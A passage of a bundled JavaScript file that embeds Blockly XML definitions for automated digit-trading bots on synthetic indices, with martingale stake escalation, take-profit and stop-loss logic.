name="TEXT">analysis</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="+2=*XrtB:_,H.ZbX=p:?" collapsed="true">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id=".VN]5$PRz#[mu4gLEpE)">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number" id="uDV:;sle3{o8l:/liSA4">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="e8^MR4,v|mL$uYo-N2,7">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="NK);}d?WZ,[io:3`jRwI">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="7M|Q{wh7BX?zpzY|TlN.">\n            <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="ymTrZ2T/bD#hXN^}%;gD" collapsed="true" x="723" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="aZ/eJwRn+2B?g?#!Rb%#" collapsed="true">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="=CPoUAxWy4D?!*TdX_:Q">\n            <field name="OP">GT</field>\n            <value name="A">\n              <block type="total_profit" id="%W]vwSTU2OHqSjiF#6vF"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="u{$,)w%F3EH+k_ppwTuh">\n                <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_join" id="wXlfZYv9q1.db)%Mk;n:" collapsed="true">\n            <field name="VARIABLE" id="Y$cG[}L|(_T-=;0ZyXI." variabletype="">text1</field>\n            <statement name="STACK">\n              <block type="text_statement" id="fEODtPvxb~Pq9(wLL(7)">\n                <value name="TEXT">\n                  <shadow type="text" id="}G!me?B=1d+JazlN/cn9">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="text" id="}z_N)o#C_q%y%O*-06h[">\n                    <field name="TEXT">Tp hit</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="[DYy),LGh$:we/z91nXm">\n                    <value name="TEXT">\n                      <shadow type="text" id="$iphA?Wh5=3Cir9KM{OT">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="text" id="cc=!2%kS#4A#EaD1emS4">\n                        <field name="TEXT">&lt;&lt; CONGRATULATIONS. &gt;&gt; You have successfully printed&gt;  &amp;</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_statement" id=":{/=:+zah8V6/Q?ZE{(z">\n                        <value name="TEXT">\n                          <shadow type="text" id="A`([INSV+:7ygD7cZ@j;">\n                            <field name="TEXT"></field>\n                          </shadow>\n                          <block type="total_profit" id="A~!}?z=.-$yZ3Y${jZ~4"></block>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="text_print" id="bn4.=Kye=;B06#m*^]Mz">\n                <value name="TEXT">\n                  <shadow type="text" id="L;9=9qa,@)]+arRqzGT|">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="variables_get" id="_a38DajDS)I21w2c[1Ou">\n                    <field name="VAR" id="Y$cG[}L|(_T-=;0ZyXI." variabletype="">text1</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="z5WP~8PDdgsb($NhN;$|">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="U(mi=kxH#ytDrvpszM,|"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="?vi^Mf0IMKgiWl?7(kXF">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="G5%tZ/b;7*ZdUOhD/7]Y">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="%0X#dsb^67G_o-lF}4z#">\n                    <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ" variabletype="">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="W[bg`R=Gq/~{0M#AfLt}">\n            <value name="TEXT">\n              <shadow type="text" id="su#SP}OYEm942K4~)nLH">\n                <field name="TEXT">SL hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="*Gyn=E:%D.Zg+QXU4/5B" collapsed="true">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="4dW}cXg#gmD#,,rnEyQ*">\n                <field name="CHECK_RESULT">loss</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="math_change" id="DmlXTt^a/Pz.1ZcJ1[DB">\n                <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="@KJq1;gh,*]xXvHs%wR]">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="5OL;;LN/RE~[8skE!*`8">\n                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="controls_if" id="vJz]y7]1v7[Lay.S9|RQ">\n                    <value name="IF0">\n                      <block type="logic_compare" id="TiYBy5{NUh21rh!]WP1{">\n                        <field name="OP">GT</field>\n                        <value name="A">\n                          <block type="variables_get" id="_f9{!u:oct6GDaaZc/?t">\n                            <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="!1:Qc)Cp#@{W$~?Jc;jw">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="CB;A*!5?-TW-xF)m}DIX">\n                        <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="6)f[75M@_[kv*{G8[P6y">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="He_x6j*4kHFBYva,NX(%">\n                <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="y!8w@QY!!M{={xj7YcAc">\n                    <field name="VAR" id="OPb$Wwph1|)^r0#|^^y}" variabletype="">Prediction after loss</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="{Bzpl6Bze5j1=9;KTYo!">\n                    <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                    <value name="VALUE">\n                      <block type="text" id="Ko,r`,iWR)zE2?zoQPy*">\n                        <field name="TEXT">gk</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="[(u[h.H,+ZSePi._I#Ae">\n                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                        <value name="DELTA">\n                          <shadow type="math_number" id=";vm%OPmNCN=gCQW)(t@S">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="math_single" id=";pMO[^7+@pX!F6{PO,cu">\n                            <field name="OP">NEG</field>\n                            <value name="NUM">\n                              <shadow type="math_number" id=")8P8lMVf0i}%mC/@]7-e">\n                                <field name="NUM">9</field>\n                              </shadow>\n                              <block type="read_details" id="qgSZdkTT+k._L1{~5Yf|">\n                                <field name="DETAIL_INDEX">4</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="KJ*,2)^Zgv|0RqFOPd5Q">\n                            <value name="IF0">\n                              <block type="logic_compare" id="J%ddIHb)=I-TK|Sh!0m5">\n                                <field name="OP">LT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="Mnd!`VtpYWWTyGQ/Ln4Q">\n                                    <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="xP:|X^Iyz=23f|,p!OT5">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="4rv~sV-aHjztXMjoEE^Q">\n                                <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="efYt//0}X;(,x:NR](*B">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="controls_if" id="fEu5CRw~xV5XY~ZPY6^g" collapsed="true">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="7N2#NJB0lz;$BIBSY#7:">\n                    <field name="OP">GT</field>\n                    <value name="A">\n                      <block type="variables_get" id="Ru9Qzl:Aj3:mEyS[xFFh">\n                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="{~q2nK%||rPAI=dKBC6u">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="variables_set" id="``9Ns8YsZLkiMUlVV[f?">\n                    <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                    <value name="VALUE">\n                      <block type="text" id="/U]vn-l$[/eR^sx2f@H5">\n                        <field name="TEXT">Mkorean SV7</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="5/jGQV7l?U^^ZK#Gl~jH">\n                        <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                        <value name="DELTA">\n                          <shadow type="math_number" id="H:-3cL?I-*LgT*^_=0cF">\n                            <field name="NUM">1</field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="poO+9^__{8%X[FxTy[Q)">\n                            <value name="IF0">\n                              <block type="logic_compare" id="yx3cUC728v|o(o*8tiM*">\n                                <field name="OP">EQ</field>\n                                <value name="A">\n                                  <block type="variables_get" id="U;a?%DCjzJNaT!W%_k;p">\n                                    <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="F!|~%qyh$eUvJ~Ck8DN7">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="sJn7HO6,bB6MF!/^y8~[">\n                                <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="GC@fih|#VBqf!uGNE%$m">\n                                    <field name="VAR" id="OPb$Wwph1|)^r0#|^^y}" variabletype="">Prediction after loss</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="I2/{Y9F%^SE^zVF)-jL`">\n                                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                                    <value name="VALUE">\n                                      <block type="math_arithmetic" id="vmwp:KfA,IW}yAO3,.F~">\n                                        <field name="OP">DIVIDE</field>\n                                        <value name="A">\n                                          <shadow type="math_number" id="K/FHvn1QO4e4z4v:OzHy">\n                                            <field name="NUM">1</field>\n                                          </shadow>\n                                          <block type="math_arithmetic" id="C2ia/?FqFCO|r@9|cl,;">\n                                            <field name="OP">MULTIPLY</field>\n                                            <value name="A">\n                                              <shadow type="math_number" id="(_{`7M`XGN8N[M_7O!N,">\n                                                <field name="NUM">1</field>\n                                              </shadow>\n                                              <block type="variables_get" id="?VzvCm3c1bSI8%=cEw|u">\n                                                <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                              </block>\n                                            </value>\n                                            <value name="B">\n                                              <shadow type="math_number" id="%^OafCLE@JX!L;@i/#n,">\n                                                <field name="NUM">1</field>\n                                              </shadow>\n                                              <block type="math_arithmetic" id="R6m56UI(u~~z]dH/:CG`">\n                                                <field name="OP">DIVIDE</field>\n                                                <value name="A">\n                                                  <shadow type="math_number" id="a2wvoTV=+sFF]BZ0cL?,">\n                                                    <field name="NUM">100</field>\n                                                  </shadow>\n                                                </value>\n                                                <value name="B">\n                                                  <shadow type="math_number" id="^?b7^);In|`Ec::.uyh5">\n                                                    <field name="NUM">24</field>\n                                                  </shadow>\n                                                  <block type="variables_get" id="]2D;spPi[pG/x~r_{wpU">\n                                                    <field name="VAR" id="VK7:nSRSXJ=|#p(oAU9v" variabletype="">Payout %</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </value>\n                                        <value name="B">\n                                          <shadow type="math_number" id="cFb#@DcZ:{~P+Fp#{adm">\n                                            <field name="NUM">1</field>\n                                          </shadow>\n                                          <block type="variables_get" id="l3s.,44;O?Y?6Y9Wn.J[">\n                                            <field name="VAR" id="!mQjsA[]viO$7Gu~UzUn" variabletype="">Martingale Split</field>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="variables_set" id=":GL+TqjAhT}R9`R7a)r-">\n                    <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="?F8*!~Iw*,Cl2E%-xZ?f">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="d`pWAxZ)-H`DyzU@)We:">\n                        <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                        <value name="VALUE">\n                          <block type="text" id=",VaK^!c3pIK`a3k:8*UG">\n                            <field name="TEXT">gk</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="lZN2-r.!$w$!$0jIytwR">\n                            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                            <value name="VALUE">\n                              <block type="variables_get" id="oPs59-gAp.s,G2l8JwZF">\n                                <field name="VAR" id="~ZEk9Zr7t[g;-`afIGOO" variabletype="">Initial Stake</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="tmEYS!$HHZK`jx;}?@@$">\n                                <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="HmhEF.Mk,SNCZfE_et#K">\n                                    <field name="VAR" id="sF6($OTq!BVWswgj}4|S" variabletype="">Prediction before loss</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <next>\n                  <block type="controls_if" id="J+v4dmlVZEBry+%nA/?@" collapsed="true">\n                    <value name="IF0">\n                      <block type="logic_compare" id="Q$x}DoiS]BBd,.}1#?D{">\n                        <field name="OP">LT</field>\n                        <value name="A">\n                          <block type="variables_get" id="jyfJ,z=)uq(o$?aOvJy/">\n                            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="Akj}7JIvuT)!kwrNj-JD">\n                            <field name="NUM">0.35</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="|dkn|CT8tQLSHu4NmLyy">\n                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="s(vOxwBuk{KQ7Pqc_Z3)">\n                            <field name="NUM">0.35</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                    <next>\n                      <block type="trade_again" id="C+Xpw8f|N)y`_}N2BA6p"></block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="MEfW!,-IYA)Nw|N9:]Q]" collapsed="true" deletable="false" x="64" y="1220">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="R0vsH,PsJ=PiWfihffVt" collapsed="true">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="^HM6~adG*H,NCT{Wbjh:" collapsed="true">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="H7PW59RD?,Kp?xpJN!c.">\n                <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="text" id="bl*30(v6`wbHz=v;rA!n">\n                <field name="TEXT">analysis</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id=")l1fu6j4Picu4#dk`oYK" collapsed="true">\n            <value name="IF0">\n              <block type="logic_compare" id="YDm+8EqUYBhaq.NKEp(~" collapsed="true">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="h+w4=F)E*A#TqpF:{tjr">\n                    <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="variables_get" id=".b/[NSo_Mz(b6aE81#V)">\n                    <field name="VAR" id="x`Ia+qCu@StiaJI^X([4" variabletype="">Entrypoint-Digit</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="apollo_purchase" id=":Nx^]Pu__xj[_w$h8*VZ" collapsed="true">\n                <field name="PURCHASE_LIST">DIGITUNDER</field>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="xXd9JKFx4pk]?ruXi_)Q" collapsed="true">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="?W~D%e;EO6*1n?vUBo[K">\n                <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="text" id="S+;:1.@y=QJ|.W}#68lZ">\n                <field name="TEXT">gk</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="apollo_purchase" id="zOCam5W}Z-j~)}t9XOPF" collapsed="true">\n            <field name="PURCHASE_LIST">DIGITUNDER</field>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="=#FQ-DvRG:x+k:/=:zpM" collapsed="true">\n            <value name="IF0">\n              <block type="logic_compare" id=",I!4r$s27MG}~,]ac,}h">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="_P#Y0$pohq8}Ts^*+c:p">\n                    <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="text" id="p,(0|5+OX`Wl^!aVU)`-">\n                    <field name="TEXT">Mkorean SV7</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="timeout" id="6;XYzu@SIXmr7.^#Y)xR">\n                <statement name="TIMEOUTSTACK">\n                  <block type="apollo_purchase" id="BvzdHe]!O+GD=E;c7NS6">\n                    <field name="PURCHASE_LIST">DIGITUNDER</field>\n                  </block>\n                </statement>\n                <value name="SECONDS">\n                  <block type="math_number" id="D`@0lu|rfT;R}~mS;Y=0">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n              </block>\n            </statement>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="tick_analysis" id="@BqMT#eB?~r!*!lw$Cte" x="96" y="1388">\n    <statement name="TICKANALYSIS_STACK">\n      <block type="variables_set" id="@%.cH#mIqC)Wl4$9ol(m">\n        <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n        <value name="VALUE">\n          <block type="lists_getIndex" id="HA?F321LSW(X6htiNCx{">\n            <mutation statement="false" at="true"></mutation>\n            <field name="MODE">GET</field>\n            <field name="WHERE">FROM_END</field>\n            <value name="VALUE">\n              <block type="lastDigitList" id="gX804KiYdl6~UquqaPP)"></block>\n            </value>\n            <value name="AT">\n              <block type="math_number" id="=edszCSX?p`sSO0OlO0(">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <next>\n          <block type="text_join" id="^Dv$/2iLZKC-*:6HiUe4">\n            <field name="VARIABLE" id="icmJXVK=|*WSXkYEU*E;" variabletype="">text</field>\n            <statement name="STACK">\n              <block type="text_statement" id="qf8!h_@O%DMKb}A(-@cS">\n                <value name="TEXT">\n                  <shadow type="text" id="JXbo}srO/#6=a:~=562H">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="text" id="09l.;el1t%J@/b0N$pe5">\n                    <field name="TEXT"> Last Appearing Digit&gt;  | </field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="Id5enOrAiqU__!JA%6iF">\n                    <value name="TEXT">\n                      <shadow type="text" id="q/GQjv(vG!#x!_~Bcjx%">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="variables_get" id="+ww=_m@`3vY^xU1lioSe">\n                        <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="btnotify" id=")GmFEC#(y),h_wWoHHIZ">\n                <field name="NOTIFICATION_TYPE">success</field>\n                <field name="NOTIFICATION_SOUND">silent</field>\n                <value name="MESSAGE">\n                  <shadow type="text" id="u9THh{ZqNQOJGlg(I41!">\n                    <field name="TEXT">Mkorean WWN</field>\n                  </shadow>\n                  <block type="variables_get" id="P7UY~?nQm6q^aja~::hf">\n                    <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            13360: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" collection="false">\n  <variables></variables>\n  <block type="trade" id="xgH69|xFn9=70w.*3Vo@" x="-98" y="1">\n    <field name="MARKET_LIST">synthetic_index</field>\n    <field name="SUBMARKET_LIST">random_index</field>\n    <field name="SYMBOL_LIST">R_25</field>\n    <field name="TRADETYPECAT_LIST">digits</field>\n    <field name="TRADETYPE_LIST">overunder</field>\n    <field name="TYPE_LIST">DIGITUNDER</field>\n    <field name="CANDLEINTERVAL_LIST">60</field>\n    <field name="TIME_MACHINE_ENABLED">FALSE</field>\n    <field name="RESTARTONERROR">TRUE</field>\n    <statement name="INITIALIZATION">\n      <block type="risk_managment" id="V9goiCU=p?o=;?fS3E4:">\n        <field name="martingale_choice">true</field>\n        <value name="martingale">\n          <block type="math_number" id="%Yh:A:;^$!1/7[EMy$M,">\n            <field name="NUM">3</field>\n          </block>\n        </value>\n        <value name="take_profit">\n          <block type="math_number" id="X1[T+~g;gYmNfXCIvU#I">\n            <field name="NUM">2</field>\n          </block>\n        </value>\n        <value name="stop_loss">\n          <block type="math_number" id="HUJ4XFSIdWH]p!aC=:nx">\n            <field name="NUM">50</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="bt_notify" id="4s2Hl0wb$Z$MT4YB}Q5X">\n        <field name="color_schemes">success</field>\n        <field name="sound">silent</field>\n        <value name="notification">\n          <block type="last_digit" id="0WkC+`x$Q_dak*fg=y;#"></block>\n        </value>\n        <next>\n          <block type="tradeOptions" id="x=V33~4Lb|(sLv`J[:Eb">\n            <field name="DURATIONTYPE_LIST">t</field>\n            <field name="BARRIEROFFSETTYPE_LIST">+</field>\n            <field name="SECONDBARRIEROFFSETTYPE_LIST">-</field>\n            <value name="DURATION">\n              <shadow type="math_number" id="U~PwAT1VO,j,af:B~~{D">\n                <field name="NUM">3</field>\n              </shadow>\n            </value>\n            <value name="AMOUNT">\n              <shadow type="math_number" id="ml)25~7^q}3I9}vjf:%K">\n                <field name="NUM">0.5</field>\n              </shadow>\n            </value>\n            <value name="PREDICTION">\n              <shadow type="math_number" id="Vh2kW0LwYt#?N:)E[~fi">\n                <field name="NUM">7</field>\n              </shadow>\n            </value>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="i-CIx.(Onm4?ihxzA}Y]" x="-98" y="572">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="8?eYKAW%VczmRXQ-ou3r">\n        <value name="IF0">\n          <block type="logic_compare" id="ruG^]B?U@-=Wr[eE6,Ni">\n            <field name="OP">GTE</field>\n            <value name="A">\n              <block type="last_digit" id="cPt(B^UcBg8sEDXndTc8"></block>\n            </value>\n            <value name="B">\n              <block type="math_number" id="~4_ce,/y#]K)c/(6kB0=">\n                <field name="NUM">7</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="purchase" id="W6q#Z-I3q3d[d3-`S[dS">\n            <field name="PURCHASE_LIST">DIGITUNDER</field>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="D^Jz1^n=2vtZku1vBN@;" x="-104" y="748">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="trade_again" id="c)S|KjoQdXc8l#J@5z3P"></block>\n    </statement>\n  </block>\n</xml>'
            },
            41841: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="https://developers.google.com/blockly/xml" is_dbot="true" collection="false">\n  <variables>\n    <variable id="kaNuTZZg#6WA.4h*oV^=">Entry Point</variable>\n    <variable id="L@/b)sz/N}%09a72BPX;">Stake</variable>\n    <variable id="e)q23w3jC#7SPFJi_~rC">Prediction</variable>\n    <variable id="TpR#!@ZaN:g6gvsyAgHw">Loop Stop</variable>\n    <variable id="is-FMy]az2Q0g8j+I|5%">Initial Stake</variable>\n    <variable id="c5=hz$~!=]^.)CA:21Zd">Martangle</variable>\n    <variable id=".y;h9Tk8uf./r@9$[8(b">Use Martingale</variable>\n    <variable id="|Ag{[(Qw/K$g1v=k)zNh">Take Profit</variable>\n    <variable id="2]oO6`(1|9(H8I5QalfU">Stop Loss</variable>\n  </variables>\n  <block type="trade_definition" id="A#/;j,6f#0U+1=7ki!yj" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="0ELN3?|#ps4EznJW[wVy" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="7XER:rs*DLM{4#?`]WL(" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="M;#hw*QCtpdU/aI@JuW." deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="(zk[8HvV{m/E!b`4h.pI" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="(p_/[v`wG3a+kxi/|zH|" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="gWB7E75:@%A{2I3G,LEQ" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="{)Sj!A,7AMu7#7Ipm`f_">\n        <field name="VAR" id="kaNuTZZg#6WA.4h*oV^=">Entry Point</field>\n        <value name="VALUE">\n          <block type="math_number" id="X*uF(GC=z8]q.Wz8LVhg">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="~V7e1m3KG|r8(6Z}kEYO">\n            <field name="VAR" id="L@/b)sz/N}%09a72BPX;">Stake</field>\n            <value name="VALUE">\n              <block type="math_number" id="NXTESPL-dgp,uEC?MS{L">\n                <field name="NUM">0.5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" 